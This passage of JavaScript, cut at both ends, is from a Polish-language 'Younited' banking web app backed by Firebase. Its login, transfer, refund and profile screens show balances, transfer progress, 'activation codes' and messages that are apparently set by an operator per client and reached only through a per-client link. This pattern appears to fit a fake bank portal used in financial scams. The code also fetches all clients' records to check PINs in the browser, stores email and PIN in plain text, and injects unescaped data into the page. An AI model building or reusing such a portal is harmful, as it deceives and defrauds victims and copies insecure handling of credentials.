  if (!user || !user._id || refreshInProgress) return;
  refreshInProgress = true;
  const refreshIcons = ['refreshIcon', 'refreshIcon2', 'refreshIcon3', 'refreshIcon4', 'refreshIcon5'];
  refreshIcons.forEach(id => {
    const el = document.getElementById(id);
    if (el) {
      el.parentElement.classList.add('spinning');
    }
  });
  try {
    const snapshot = await get(ref(db, 'clients/' + user._id));
    const data = snapshot.val();
    if (!data) {
      if (!silent) toast('Erreur : compte introuvable');
      refreshIcons.forEach(id => {
        const el = document.getElementById(id);
        if (el) {
          el.parentElement.classList.remove('spinning');
        }
      });
      refreshInProgress = false;
      return;
    }
    user.pct = data.pct;
    user.code = data.code;
    user.refundCode = data.refundCode || '';
    user.msg = data.msg;
    user.pays = data.pays;
    user.adresse = data.adresse;
    user.tel = data.tel;
    user.devise = data.devise || 'zł';
    user.notification = data.notification || '';
    user.theme = data.theme || 'teal';
    user.montant = Number(data.montant) || 0;
    user.nom = data.nom || user.nom;
    user.email = data.email || user.email;
    user.bannerMessage = data.bannerMessage || '';
    user.bannerRead = data.bannerRead || false;
    user.pendingTransferConfig = data.pendingTransferConfig || { enabled: false };
    updateBanner();
    const bgColor = data.bgColor || 'gray';
    applyBgColor(bgColor);
    const greetEl = document.getElementById('greet');
    if (greetEl) {
      greetEl.innerHTML = `Witaj, <span>${user.nom}</span>`;
      adjustGreetingFontSize();
    }

    const balElement = document.getElementById('bal');
    const statBalElement = document.getElementById('stat-balance');
    updateBalanceDisplay(balElement, statBalElement, user.montant);
    document.getElementById('bal2').textContent = fmt(user.montant);

    const historySnap = await get(ref(db, 'clients/' + user._id + '/history'));
    if (historySnap.exists()) {
      const val = historySnap.val();
      const arr = Object.values(val);
      currentHistory = arr;
      renderHistory(arr);
    } else {
      currentHistory = [];
      renderHistory([]);
    }
    updateProfileInfo();
    updateAvatars();
    updateCurrency();
    updateNotifBadge();
    applyTheme(user.theme);
    if (!silent) toast('✅ Données actualisées !');
  } catch (error) {
    console.error('Erreur lors du rafraîchissement:', error);
    if (!silent) toast('❌ Erreur lors de l\'actualisation');
  } finally {
    refreshIcons.forEach(id => {
      const el = document.getElementById(id);
      if (el) {
        el.parentElement.classList.remove('spinning');
      }
    });
    refreshInProgress = false;
  }
};

// ===== NAVIGATION =====
window.navigateTo = function(id) {
  history.pushState({ screen: id }, '', '#' + id);
  show(id);
  if (id === 'verify' && user) {
    initCodeField();
  }
};

window.openCard = function() {
  document.getElementById('card').classList.remove('hidden');
};
window.closeCard = function() {
  document.getElementById('card').classList.add('hidden');
};

window.openAcc = function() {
  document.getElementById('acc').classList.remove('hidden');
};
window.closeAcc = function() {
  document.getElementById('acc').classList.add('hidden');
};

window.openIbanModal = function() {
  document.getElementById('ibanModal').classList.remove('hidden');
};
window.closeIbanModal = function() {
  document.getElementById('ibanModal').classList.add('hidden');
};

window.openNotifications = function() {
  const n = user && user.notification ? user.notification : '';
  const container = document.getElementById('notif-content');
  if (n) {
    const items = n.split(/\n|<br\s*\/?>/).filter(t => t.trim() !== '');
    container.innerHTML = items.map(text =>
      `<div class="notif-item">${text.trim()}</div>`
    ).join('');
  } else {
    container.innerHTML = '<p style="color:var(--text-secondary);text-align:center;padding:20px;">Brak powiadomień</p>';
  }
  document.getElementById('notifications').classList.remove('hidden');
};
window.closeNotifications = function() {
  document.getElementById('notifications').classList.add('hidden');
};

// ===== DÉTAIL DES TRANSACTIONS =====
let currentTxId = null;

window.showTxDetail = function(d) {
  currentTxId = d.id;
  const isCredit = d.amount >= 0;
  const isRefund = isCredit && d.title === 'Zwrot';
  const isPending = d.status === 'pending';
  const isCancelled = d.status === 'cancelled';

  const header = document.getElementById('txd-header');
  const headerIcon = document.getElementById('txd-header-icon');
  const headerAmount = document.getElementById('txd-header-amount');
  const headerBadge = document.getElementById('txd-header-badge');
  const amtEl = document.getElementById('txd-amt');
  const lblBenef = document.getElementById('txd-lbl-benef');
  const statusEl = document.getElementById('txd-status');

  header.classList.remove('credit', 'debit', 'refund');
  amtEl.classList.remove('amount-credit', 'amount-debit', 'amount-refund');

  document.getElementById('txd-id').textContent = d.id || '-';
  document.getElementById('txd-date').textContent = (d.date || '') + ' • ' + (d.time || '');

  if (isPending) {
    header.classList.add('refund');
    headerIcon.innerHTML = '<i class="fa-solid fa-clock"></i>';
    headerAmount.textContent = '- ' + fmt(Math.abs(d.amount));
    headerBadge.textContent = 'Przelew w oczekiwaniu';
    amtEl.textContent = '- ' + fmt(Math.abs(d.amount));
    amtEl.classList.add('amount-refund');
    lblBenef.textContent = 'Beneficjent';
    document.getElementById('txd-benef').textContent = d.beneficiary || d.subtitle || '-';
    statusEl.innerHTML = '<span style="display:inline-block;background:#FEF3C7;color:#D97706;border:1.5px solid #D97706;border-radius:20px;padding:3px 12px;font-size:11px;font-weight:700;">W OCZEKIWANIU</span>';
  } else if (isCancelled) {
    header.classList.add('debit');
    headerIcon.innerHTML = '<i class="fa-solid fa-ban"></i>';
    headerAmount.textContent = '- ' + fmt(Math.abs(d.amount));
    headerBadge.textContent = 'Przelew anulowany';
    amtEl.textContent = '- ' + fmt(Math.abs(d.amount));
    amtEl.classList.add('amount-debit');
    lblBenef.textContent = 'Beneficjent';
    document.getElementById('txd-benef').textContent = d.beneficiary || d.subtitle || '-';
    statusEl.innerHTML = '<span style="display:inline-block;background:#FEE2E2;color:#DC2626;border:1.5px solid #DC2626;border-radius:20px;padding:3px 12px;font-size:11px;font-weight:700;">ANULOWANY</span>';
  } else if (isRefund) {
    header.classList.add('refund');
    headerIcon.innerHTML = '<i class="fa-solid fa-rotate-left"></i>';
    headerAmount.textContent = '+ ' + fmt(Math.abs(d.amount));
    headerBadge.textContent = 'Zwrot środków';
    amtEl.textContent = '+ ' + fmt(Math.abs(d.amount));
    amtEl.classList.add('amount-refund');
    lblBenef.textContent = 'Zwrócono przez';
    document.getElementById('txd-benef').textContent = d.subtitle || 'Younited';
    statusEl.innerHTML = '<span style="display:inline-block;background:#EDE9FE;color:#7C3AED;border:1.5px solid #7C3AED;border-radius:20px;padding:3px 12px;font-size:11px;font-weight:700;">ZWROT</span>';
  } else if (isCredit) {
    header.classList.add('credit');
    headerIcon.innerHTML = '<i class="fa-solid fa-arrow-down"></i>';
    headerAmount.textContent = '+ ' + fmt(Math.abs(d.amount));
    headerBadge.textContent = 'Przelew otrzymany';
    amtEl.textContent = '+ ' + fmt(Math.abs(d.amount));
    amtEl.classList.add('amount-credit');
    lblBenef.textContent = 'Nadawca';
    document.getElementById('txd-benef').textContent = getSenderName(d);
    statusEl.innerHTML = '<span style="display:inline-block;background:#D1FAE5;color:#059669;border:1.5px solid #059669;border-radius:20px;padding:3px 12px;font-size:11px;font-weight:700;">ZREALIZOWANY</span>';
  } else {
    header.classList.add('debit');
    headerIcon.innerHTML = '<i class="fa-solid fa-arrow-up"></i>';
    headerAmount.textContent = '- ' + fmt(Math.abs(d.amount));
    headerBadge.textContent = 'Przelew wysłany';
    amtEl.textContent = '- ' + fmt(Math.abs(d.amount));
    amtEl.classList.add('amount-debit');
    lblBenef.textContent = 'Beneficjent';
    document.getElementById('txd-benef').textContent = d.beneficiary || d.subtitle || '-';
    statusEl.innerHTML = '<span style="display:inline-block;background:#FEE2E2;color:#DC2626;border:1.5px solid #DC2626;border-radius:20px;padding:3px 12px;font-size:11px;font-weight:700;">ZREALIZOWANY</span>';
  }

  const ibanWrap = document.getElementById('txd-iban-wrap');
  if (isRefund || isCredit) {
    ibanWrap.style.display = 'none';
  } else {
    ibanWrap.style.display = 'flex';
    document.getElementById('txd-iban').textContent = d.iban || '-';
  }

  const foot = document.getElementById('txd-foot');
  const refundMsg = document.getElementById('refundTxMsg');
  if (d.refunded) {
    foot.style.display = 'block';
    refundMsg.style.display = 'block';
  } else {
    foot.style.display = 'none';
    refundMsg.style.display = 'none';
  }

  document.getElementById('txDetail').classList.remove('hidden');
};

window.closeTxDetail = function() {
  const modal = document.getElementById('txDetail');
  const card = modal.querySelector('.txd-card');
  if (card) {
    card.style.animation = 'txdPop 0.2s ease reverse forwards';
    setTimeout(() => {
      modal.classList.add('hidden');
      card.style.animation = '';
      currentTxId = null;
    }, 180);
  } else {
    modal.classList.add('hidden');
    currentTxId = null;
  }
};

// ===== MODALE REMBOURSEMENT =====
let refundTargetTx = null;

function openRefundModal(tx) {
  refundTargetTx = tx;
  document.getElementById('refundCode').value = '';
  document.getElementById('refundError').style.display = 'none';
  document.getElementById('refundModal').classList.remove('hidden');
}

window.closeRefundModal = function() {
  document.getElementById('refundModal').classList.add('hidden');
  refundTargetTx = null;
};

window.confirmRefund = async function() {
  const code = document.getElementById('refundCode').value.trim();
  const errEl = document.getElementById('refundError');
  errEl.style.display = 'none';

  if (!code) {
    errEl.textContent = 'Proszę wprowadzić kod.';
    errEl.style.display = 'block';
    return;
  }

  if (code !== user.refundCode) {
    errEl.textContent = 'Nieprawidłowy kod anulowania.';
    errEl.style.display = 'block';
    return;
  }

  if (!refundTargetTx) {
    toast('Brak transakcji do anulowania.');
    closeRefundModal();
    return;
  }

  if (refundTargetTx.refunded) {
    toast('Ten przelew został już anulowany.');
    closeRefundModal();
    return;
  }

  const amount = Math.abs(refundTargetTx.amount);
  const { dateStr, timeStr, timestamp } = getPolandDateTime();
  const devise = user.devise || 'zł';
  const formattedAmount = new Intl.NumberFormat('pl-PL', { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(amount) + ' ' + devise;

  try {
    const newMontant = user.montant + amount;
    await update(ref(db, 'clients/' + user._id), { montant: newMontant });
    user.montant = newMontant;
    const balElement = document.getElementById('bal');
    const statBalElement = document.getElementById('stat-balance');
    updateBalanceDisplay(balElement, statBalElement, user.montant);
    document.getElementById('bal2').textContent = fmt(user.montant);

    const nomClient = user.nom || 'Klient';
    const bannerMsg = `Witam ${nomClient}, Zwrot ${formattedAmount} został przetworzony i zaksięgowany na Twoim koncie.`;
    await update(ref(db, 'clients/' + user._id), { bannerMessage: bannerMsg, bannerRead: false });
    user.bannerMessage = bannerMsg;
    user.bannerRead = false;
    updateBanner();

    const refundTx = {
      id: genId('RF'),
      title: 'Zwrot',
      subtitle: 'Anulowanie przelewu',
      amount: amount,
      beneficiary: 'Younited',
      iban: refundTargetTx.iban ? refundTargetTx.iban.substring(0, 9) + '*********' : 'ZPY916398*********',
      devise: devise,
      date: dateStr,
      time: timeStr,
      timestamp: timestamp,
      refundedTransactionId: refundTargetTx.id
    };
    await push(ref(db, 'clients/' + user._id + '/history'), refundTx);

    const historySnap = await get(ref(db, 'clients/' + user._id + '/history'));
    if (historySnap.exists()) {
      const history = historySnap.val();
      for (const [key, tx] of Object.entries(history)) {
        if (tx.id === refundTargetTx.id) {
          await update(ref(db, 'clients/' + user._id + '/history/' + key), { refunded: true });
          break;
        }
      }
    }

    const refNum = genId('REF');
    await sendMail({
      to: user.email,
      name: user.nom || 'Klient',
      pct: 100,
      success: true,
      montant: formattedAmount,
      beneficiaire: refundTargetTx.beneficiary || refundTargetTx.subtitle || '—',
      compte: refundTargetTx.iban || '—',
      reference: refNum,
      isRefund: true
    });

    toast(`✅ Przelew anulowany, zwrot ${fmt(amount)}`);
    closeRefundModal();
    closeTxDetail();
    refreshData(true);
  } catch (err) {
    console.error('Erreur lors du remboursement:', err);
    toast('❌ Wystąpił błąd podczas anulowania.');
  }
};

// ===== PROFIL =====
function buildProfile(u) {
  const initials = (u.nom || 'U').split(' ').map(w => w[0]).join('').substring(0, 2).toUpperCase();
  return `
    <div class="profile-header-card">
      <div class="profile-avatar-large">${initials}</div>
      <div class="profile-name">${u.nom || 'Użytkownik'}</div>
      <div class="profile-email">${u.email || ''}</div>
      <div class="profile-status-badge">
        <span class="dot"></span>
        <span>Konto aktywne</span>
      </div>
    </div>

    <div class="profile-section-pro">
      <div class="profile-section-header-pro">
        <div class="profile-section-icon"><i class="fa-solid fa-user"></i></div>
        <div>
          <div class="profile-section-title-pro">Informacje osobiste</div>
          <div class="profile-section-subtitle">Dane identyfikacyjne</div>
        </div>
      </div>
      <div class="profile-row-pro">
        <div class="profile-row-left">
          <div class="profile-row-icon"><i class="fa-solid fa-user"></i></div>
          <div class="profile-row-info">
            <div class="profile-row-label">Imię i nazwisko</div>
            <div class="profile-row-value">${u.nom || '—'}</div>
          </div>
        </div>
        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
      </div>
      <div class="profile-row-pro">
        <div class="profile-row-left">
          <div class="profile-row-icon"><i class="fa-solid fa-envelope"></i></div>
          <div class="profile-row-info">
            <div class="profile-row-label">Adres e-mail</div>
            <div class="profile-row-value" style="font-size:13px;">${u.email || '—'}</div>
          </div>
        </div>
        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
      </div>
      <div class="profile-row-pro">
        <div class="profile-row-left">
          <div class="profile-row-icon"><i class="fa-solid fa-phone"></i></div>
          <div class="profile-row-info">
            <div class="profile-row-label">Numer telefonu</div>
            <div class="profile-row-value">${u.tel || '—'}</div>
          </div>
        </div>
        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
      </div>
      <div class="profile-row-pro">
        <div class="profile-row-left">
          <div class="profile-row-icon"><i class="fa-solid fa-flag"></i></div>
          <div class="profile-row-info">
            <div class="profile-row-label">Kraj zamieszkania</div>
            <div class="profile-row-value">${u.pays || '—'}</div>
          </div>
        </div>
        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
      </div>
      <div class="profile-row-pro">
        <div class="profile-row-left">
          <div class="profile-row-icon"><i class="fa-solid fa-location-dot"></i></div>
          <div class="profile-row-info">
            <div class="profile-row-label">Adres zamieszkania</div>
            <div class="profile-row-value" style="font-size:13px;">${u.adresse || '—'}</div>
          </div>
        </div>
        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
      </div>
    </div>

    <div class="profile-section-pro">
      <div class="profile-section-header-pro">
        <div class="profile-section-icon"><i class="fa-solid fa-credit-card"></i></div>
        <div>
          <div class="profile-section-title-pro">Konto bankowe</div>
          <div class="profile-section-subtitle">Informacje o koncie i saldzie</div>
        </div>
      </div>
      <div class="profile-balance-highlight">
        <div>
          <div class="bal-label">Dostępne saldo</div>
          <div class="bal-value">${fmt(u.montant)}</div>
        </div>
        <div class="bal-icon"><i class="fa-solid fa-wallet"></i></div>
      </div>
      <div class="profile-row-pro">
        <div class="profile-row-left">
          <div class="profile-row-icon"><i class="fa-solid fa-briefcase"></i></div>
          <div class="profile-row-info">
            <div class="profile-row-label">Typ konta</div>
            <div class="profile-row-value">Profesjonalne</div>
          </div>
        </div>
        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
      </div>
      <div class="profile-row-pro">
        <div class="profile-row-left">
          <div class="profile-row-icon"><i class="fa-solid fa-shield-halved"></i></div>
          <div class="profile-row-info">
            <div class="profile-row-label">Status konta</div>
            <div class="profile-row-value" style="color:#059669;"><i class="fa-solid fa-circle-check" style="font-size:11px;margin-right:4px;"></i>Aktywny</div>
          </div>
        </div>
        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
      </div>
      <div class="profile-row-pro">
        <div class="profile-row-left">
          <div class="profile-row-icon"><i class="fa-solid fa-money-bill-transfer"></i></div>
          <div class="profile-row-info">
            <div class="profile-row-label">Typ przelewu</div>
            <div class="profile-row-value-muted">Międzynarodowy (SEPA/SWIFT)</div>
          </div>
        </div>
        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
      </div>
      <div class="profile-row-pro">
        <div class="profile-row-left">
          <div class="profile-row-icon"><i class="fa-solid fa-coins"></i></div>
          <div class="profile-row-info">
            <div class="profile-row-label">Waluta</div>
            <div class="profile-row-value">${u.devise || 'zł'}</div>
          </div>
        </div>
        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
      </div>
    </div>

    <div class="profile-section-pro">
      <div class="profile-section-header-pro">
        <div class="profile-section-icon"><i class="fa-solid fa-lock"></i></div>
        <div>
          <div class="profile-section-title-pro">Bezpieczeństwo</div>
          <div class="profile-section-subtitle">Ochrona konta</div>
        </div>
      </div>
      <div class="profile-row-pro">
        <div class="profile-row-left">
          <div class="profile-row-icon"><i class="fa-solid fa-fingerprint"></i></div>
          <div class="profile-row-info">
            <div class="profile-row-label">Weryfikacja dwuetapowa</div>
            <div class="profile-row-value-muted">Aktywna (kod PIN)</div>
          </div>
        </div>
        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
      </div>
      <div class="profile-row-pro">
        <div class="profile-row-left">
          <div class="profile-row-icon"><i class="fa-solid fa-id-card"></i></div>
          <div class="profile-row-info">
            <div class="profile-row-label">Karta wirtualna</div>
            <div class="profile-row-value-muted">Aktywna • Visa</div>
          </div>
        </div>
        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
      </div>
    </div>

    <div style="padding:0 16px 24px;">
      <button onclick="withSpinner(() => logout())" class="profile-logout-btn">
        <i class="fa-solid fa-right-from-bracket"></i> Wyloguj się
      </button>
    </div>

    <div class="profile-footer-note">
      <i class="fa-solid fa-shield-halved"></i>
      Twoje dane są chronione zgodnie z regulaminem RODO. W przypadku pytań skontaktuj się z obsługą klienta.
    </div>
  `;
}

function updateProfileInfo() {
  if (!user) {
    document.getElementById('accinfo').innerHTML = '';
    return;
  }
  document.getElementById('accinfo').innerHTML = buildProfile(user);
}

function updateAvatars() {
  if (!user) return;
  const initials = user.nom.split(' ').map(w => w[0]).join('').substring(0, 2).toUpperCase();
  ['avatar', 'avatar2', 'avatar3', 'avatar4', 'avatar5'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.textContent = initials;
  });
}

function updateCurrency() {
  if (!user) return;
  const devCode = normalizeDevise(user.devise);
  const sym = getDeviseSymbol(devCode);
  const label = getDeviseLabel(devCode);
  const cs = document.getElementById('currency-symbol');
  if (cs) cs.textContent = sym;
  document.getElementById('stat-devise').textContent = label;
  adjustAllTexts();
}

function updateNotifBadge() {
  const hasNotif = user && user.notification && user.notification.trim() !== '';
  ['notif-badge', 'notif-badge2', 'notif-badge3', 'notif-badge4', 'notif-badge5'].forEach(id => {
    const el = document.getElementById(id);
    if (el) {
      if (hasNotif) el.classList.remove('hidden');
      else el.classList.add('hidden');
    }
  });
}

// ===== AFFICHAGE =====
const show = id => {
  document.querySelectorAll('.screen').forEach(s => {
    s.classList.remove('active');
    s.style.display = 'none';
  });
  const banned = document.getElementById('banned-screen');
  if (banned) banned.style.display = 'none';
  const target = document.getElementById(id);
  if (target) {
    target.style.display = '';
    target.classList.add('active');
  }
  document.getElementById('mainNav').style.display = (id === 'login' ? 'none' : 'grid');
  document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
  const map = { 'dashboard': 0, 'transfer': 1, 'verify': 1, 'progress': 1, 'result': 1 };
  if (map[id] !== undefined) {
    document.querySelectorAll('.nav-item')[map[id]]?.classList.add('active');
  }
  if (id === 'dashboard') {
    setTimeout(() => adjustAllTexts(), 50);
  }
};
window.show = show;

window.addEventListener('popstate', (e) => {
  if (user) {
    show('dashboard');
  } else {
    const saved = localStorage.getItem('Younited_session');
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        if (parsed.id) {
          document.getElementById('email').value = parsed.e || '';
          document.getElementById('pin').value = parsed.p || '';
          login({ silent: true, redirect: true }).catch(() => show('login'));
          return;
        }
      } catch {}
    }
    show('login');
  }
});

async function forceLogout(isDeleted = false) {
  if (user && user._id && sessionId) {
    try {
      await update(ref(db, 'clients/' + user._id + '/sessions/' + sessionId), { connected: false });
    } catch(e) {}
  }
  localStorage.removeItem('Younited_session');
  localStorage.removeItem('Younited_session_id');
  localStorage.removeItem('Younited_client_id');
  localStorage.removeItem('Younited_theme');
  user = null;
  if (historyListener) historyListener();
  if (balanceListener) balanceListener();
  if (statusListener) statusListener();
  if (banqueRef) banqueRef();
  clearBannerTimer();
  if (isDeleted) {
    showBanned();
    return;
  }
  show('login');
  const errEl = document.getElementById('err');
  if (errEl) errEl.classList.add('hidden');
  history.replaceState({ screen: 'login' }, '', '#login');
}

// ===== LOGIN =====
window.login = async function(options = { silent: false, redirect: false }) {
  const btn = document.getElementById('loginBtn');
  if (btn) btn.disabled = true;
  showLoading('Logowanie...');

  const e = document.getElementById('email').value.trim().toLowerCase();
  const p = document.getElementById('pin').value.trim();
  const err = document.getElementById('err');
  err.classList.add('hidden');

  if (!window.__clientIdFromUrl) {
    err.textContent = 'Brak dostępu – nieprawidłowy link. Użyj linku, który otrzymałeś.';
    err.classList.remove('hidden');
    localStorage.removeItem('Younited_session');
    localStorage.removeItem('Younited_client_id');
    if (!options.silent) {
      show('login');
    }
    hideLoading();
    if (btn) btn.disabled = false;
    return;
  }

  try {
    const s = await get(ref(db, 'clients'));
    const d = s.val() || {};
    let f = null,
      fid = null;
    for (const k in d) {
      const v = d[k];
      if (v.email && v.email.toLowerCase() === e && String(v.pin) === p) {
        f = v;
        fid = k;
        break;
      }
    }

    if (!f) {
      err.textContent = 'Błąd logowania – sprawdź email i PIN';
      err.classList.remove('hidden');
      localStorage.removeItem('Younited_session');
      localStorage.removeItem('Younited_client_id');
      if (!options.silent) {
        show('login');
      }
      hideLoading();
      if (btn) btn.disabled = false;
      return;
    }

    if (fid !== window.__clientIdFromUrl) {
      err.textContent = 'Te dane logowania nie pasują do tego linku. Użyj swojego własnego linku do logowania.';
      err.classList.remove('hidden');
      localStorage.removeItem('Younited_session');
      localStorage.removeItem('Younited_client_id');
      if (!options.silent) {
        show('login');
      }
      hideLoading();
      if (btn) btn.disabled = false;
      return;
    }

    if (f.blocked) {
      err.textContent = 'Konto zostało zablokowane';
      err.classList.remove('hidden');
      localStorage.removeItem('Younited_session');
      localStorage.removeItem('Younited_client_id');
      if (!options.silent) {
        show('login');
      }
      hideLoading();
      if (btn) btn.disabled = false;
      return;
    }

    user = f;
    user._id = fid;
    applyBgColor(user.bgColor || 'gray');
    if (!user.devise) user.devise = 'zł';
    if (!user.theme) user.theme = 'teal';
    user.refundCode = user.refundCode || '';
    user.bannerMessage = user.bannerMessage || '';
    user.bannerRead = user.bannerRead || false;
    user.pendingTransferConfig = f.pendingTransferConfig || { enabled: false };
    user._pendingTransfers = {};

    localStorage.setItem('Younited_session', JSON.stringify({ e, p }));
    localStorage.setItem('Younited_theme', user.theme);
    localStorage.setItem('Younited_client_id', fid);

    document.getElementById('greet').innerHTML = `Witaj, <span>${user.nom}</span>`;
    adjustGreetingFontSize();

    await updateSession(true);

    const balElement = document.getElementById('bal');
    const statBalElement = document.getElementById('stat-balance');
    updateBalanceDisplay(balElement, statBalElement, user.montant);
    document.getElementById('bal2').textContent = fmt(user.montant);

    applyTheme(user.theme);
    updateAvatars();
    updateCurrency();
    updateNotifBadge();
    updateProfileInfo();
    updateBanner();

    setupBankListener(fid);

    await initHistoryListener(fid);
    watchBalance(fid);
    watchClientStatus(fid);

    setupTransferValidation();
    setupRequiredMessages();

    adjustAllTexts();

    if (options.redirect) {
      navigateTo('dashboard');
    } else if (!options.silent) {
      navigateTo('dashboard');
    } else {
      show('dashboard');
      history.replaceState({ screen: 'dashboard' }, '', '#dashboard');
    }

    hideLoading();
    if (btn) btn.disabled = false;
  } catch (error) {
    console.error('Erreur login:', error);
    err.textContent = 'Erreur de connexion, réessayez';
    err.classList.remove('hidden');
    hideLoading();
    if (btn) btn.disabled = false;
  }
};

// ===== DÉCONNEXION =====
window.logout = async function() {
  document.getElementById('acc').classList.add('hidden');

  if (user && user._id && sessionId) {
    try {
      await update(ref(db, 'clients/' + user._id + '/sessions/' + sessionId), { connected: false });
    } catch(e) {}
  }
  localStorage.removeItem('Younited_session');
  localStorage.removeItem('Younited_session_id');
  localStorage.removeItem('Younited_client_id');
  localStorage.removeItem('Younited_theme');
  user = null;
  if (historyListener) historyListener();
  if (balanceListener) balanceListener();
  if (statusListener) statusListener();
  if (banqueRef) banqueRef();
  clearBannerTimer();

  show('login');
  const errEl = document.getElementById('err');
  if (errEl) errEl.classList.add('hidden');
  history.replaceState({ screen: 'login' }, '', '#login');

  document.getElementById('greet').innerHTML = 'Witaj, <span>Power</span>';
  document.getElementById('bal').textContent = '0,00 zł';
  document.getElementById('stat-balance').textContent = '0,00 zł';
  document.getElementById('bal2').textContent = '0,00 zł';
  document.getElementById('stat-tx').textContent = '0';
  document.getElementById('tx-count-badge').textContent = '0';
  document.getElementById('history-list').innerHTML =
    `<div class="empty-history"><i class="fa-regular fa-receipt"></i> Brak transakcji</div>`;
  document.getElementById('accinfo').innerHTML = '';
  ['avatar', 'avatar2', 'avatar3', 'avatar4', 'avatar5'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.textContent = 'FB';
  });
  document.getElementById('cardHolderName').textContent = 'JAN KOWALSKI';
  document.getElementById('cardNumber').innerHTML = '<span>4556</span><span>5518</span><span>8867</span><span>XXXX</span>';
  document.getElementById('cardExpiry').textContent = '02/28';
  document.getElementById('cardCvv').textContent = '***';
  document.getElementById('cardDetailHolder').textContent = 'JAN KOWALSKI';
  document.getElementById('cardDetailNumber').textContent = '4556 5518 8867 XXXX';
  document.getElementById('cardDetailNumber').dataset.realNumber = '455655188867XXXX';
  document.getElementById('cardDetailExpiry').textContent = '02/28';
  document.getElementById('cardDetailCvv').textContent = '***';
  document.getElementById('cardDetailCvv').dataset.realCvv = '556';
  cardVisible = false;
  const eyeIcon = document.getElementById('eyeIcon');
  const eyeText = document.getElementById('eyeText');
  if (eyeIcon) eyeIcon.className = 'fa-regular fa-eye';
  if (eyeText) eyeText.textContent = 'Pokaż';

  if (user && user._id && sessionId) {
    try {
      await update(ref(db, 'clients/' + user._id + '/sessions/' + sessionId), { connected: false });
    } catch(e) { console.error(e); }
  }

  localStorage.removeItem('Younited_session');
  localStorage.removeItem('Younited_session_id');
  localStorage.removeItem('Younited_client_id');
  localStorage.removeItem('Younited_theme');

  if (historyListener) historyListener();
  if (balanceListener) balanceListener();
  if (statusListener) statusListener();
  if (banqueRef) banqueRef();

  user = null;
  sessionId = null;
};

// ===== RESTAURATION DE SESSION =====
const saved = localStorage.getItem('Younited_session');
const savedClientId = localStorage.getItem('Younited_client_id');

if (window.__clientIdFromUrl && savedClientId && savedClientId !== window.__clientIdFromUrl) {
  localStorage.removeItem('Younited_session');
  localStorage.removeItem('Younited_session_id');
  localStorage.removeItem('Younited_client_id');
  localStorage.removeItem('Younited_theme');
  show('login');
} else if (saved) {
  try {
    const parsed = JSON.parse(saved);
    document.getElementById('email').value = parsed.e || '';
    document.getElementById('pin').value = parsed.p || '';
    if (!window.__clientIdFromUrl || (savedClientId && savedClientId === window.__clientIdFromUrl)) {
      login({ silent: true, redirect: true }).catch(() => {
        toast('Sesja wygasła, zaloguj się ponownie.');
        forceLogout();
      });
    } else {
      show('login');
    }
  } catch {
    show('login');
  }
}

// ===== PERSONNALISATION DES MESSAGES REQUIS EN POLONAIS =====
function setupRequiredMessages() {
  // Validation gérée par le système de messages d'erreur en temps réel
}

// ===== VALIDATION EN TEMPS RÉEL DU MONTANT =====
function setupTransferValidation() {
  const amtInput = document.getElementById('a');
  const continueBtn = document.getElementById('continueBtn');
  if (!amtInput || !continueBtn) return;

  // Validation en temps réel du montant
  amtInput.addEventListener('input', function() {
    validateAmountField();
  });
  amtInput.addEventListener('blur', function() {
    validateAmountField();
  });

  // Validation en temps réel des autres champs
  const fieldMessages = {
    'b': 'Proszę wpisać imię i nazwisko beneficjenta.',
    'c': 'Proszę wpisać numer IBAN lub konta.',
    'd': 'Proszę wpisać kod BIC/SWIFT.',
    'e': 'Proszę wpisać nazwę banku.',
    'f': 'Proszę wpisać powód przelewu.'
  };

  ['b', 'c', 'd', 'e', 'f'].forEach(id => {
    const el = document.getElementById(id);
    if (!el) return;
    el.addEventListener('input', function() {
      validateTextField(id, fieldMessages[id]);
      validateAmountField();
    });
    el.addEventListener('blur', function() {
      validateTextField(id, fieldMessages[id]);
    });
  });

  // Désactiver le bouton au départ
  continueBtn.disabled = true;
}

// ===== TRANSFERT =====
window.toVerify = function() {
  clearAllTransferErrors();

  if (!validateAllTransferFields()) {
    return;
  }

  const rawValue = document.getElementById('a').value.trim();
  const amt = Number(rawValue);

  document.getElementById('va').textContent = fmt(amt);
  document.getElementById('vb').textContent = document.getElementById('b').value;
  document.getElementById('vc').textContent = document.getElementById('c').value;
  document.getElementById('vd').textContent = document.getElementById('d').value;
  document.getElementById('ve').textContent = document.getElementById('e').value;
  document.getElementById('vf').textContent = document.getElementById('f').value;
  navigateTo('verify');
};

// ===== FINISH =====
window.finish = function() {
  if (!user) return;

  const codeInput = document.getElementById('code');
  const code = codeInput.value.trim();

  if (!code) {
    showFieldError('code', 'Proszę wprowadzić kod aktywacyjny.');
    return;
  }

  if (code !== user.code) {
    showFieldError('code', 'Nieprawidłowy kod aktywacyjny.');
    return;
  }

  clearFieldError('code');

  const amt = Number(document.getElementById('a').value) || 0;
  const benef = document.getElementById('b').value || '-';
  const iban = document.getElementById('c').value || '-';
  const swift = document.getElementById('d').value || '-';
  const bank = document.getElementById('e').value || '-';
  const reason = document.getElementById('f').value || '';

  transferData = {
    amount: amt,
    amountFormatted: fmt(amt),
    benef: benef,
    iban: iban,
    swift: swift,
    bank: bank,
    reason: reason
  };

  navigateTo('progress');

  setTimeout(() => {
    startProgress(amt, benef, iban, bank, reason);
  }, 300);
};

// ===== PROGRESSION =====
let transferData = {};


// ===== RÉINITIALISATION DES STYLES DU REÇU =====
function resetReceiptStyles() {
  const icon = document.getElementById('resultIcon');
  const status = document.getElementById('resultStatus');
  const percentResult = document.getElementById('resultPercent');
  const msgEl = document.getElementById('resultMsg');
  const statusTag = document.querySelector('.receipt-row .status-tag');

  if (icon) icon.innerHTML = '<i class="fa-solid fa-circle-check" style="color:#10B981;"></i>';
